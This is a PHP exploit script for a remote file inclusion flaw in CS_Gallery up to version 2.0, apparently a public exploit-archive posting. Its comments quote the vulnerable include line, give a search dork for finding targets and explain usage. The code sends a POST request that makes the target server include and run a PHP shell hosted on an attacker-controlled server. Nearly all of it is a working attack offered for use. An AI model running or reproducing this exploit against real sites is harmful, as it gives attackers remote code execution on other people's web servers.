<?php

//File Inclusion Exploit for CS_Gallery <= 2.0
//Found and Exploit Coded by burncycle - burncycle[(at)]hotmail[(dot)]de
//|
//Vendor: http://www.cschneider.de/
//Dork: . www.cschneider.info
//|
//Bug in "index.php":
//..
//$codefile=$_POST['album'].'/code.php';
//include $codefile;
//..
//|
//Usage: php exploit.php [pathtoscript] [pathtoshell]
//Example: php exploit.php 
http://pathtoscript.com/cs_gallery/(index.php?todo=securealbum) 
http://pathtoshell.com/(code.php)
//|
//Needs the cURL extension of PHP
//Works regardless of PHP settings

//Nur ausnahme Fehler anzeigen
error_reporting(1);

echo "Usage: php ".$_SERVER["argv"][0]." [pathtoscript] 
[pathtoshell]\r\n\r\n";
echo "Example: php ".$_SERVER["argv"][0]." 
http://pathtoscript.com/cs_gallery/(index.php?todo=securealbum) 
http://pathtoshell.com/(code.php)\r\n\r\n";

//Schauen ob alles angegeben wurde
if(!empty($_SERVER["argv"][1]) && !empty($_SERVER["argv"][2]))
{

$pathtoscript = $_SERVER["argv"][1];
$pathtoshell = $_SERVER["argv"][2];

//erzeuge ein neues cURL Handle
$ch = curl_init();

//setzte die URL und andere Optionen
curl_setopt($ch, CURLOPT_URL, 
$pathtoscript."index.php?todo=securealbum");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "album=".$pathtoshell);

//f.hre die Aktion aus
curl_exec($ch);

//schlie.e das Handle und gebe Systemresourcen frei
curl_close($ch);

}

?>

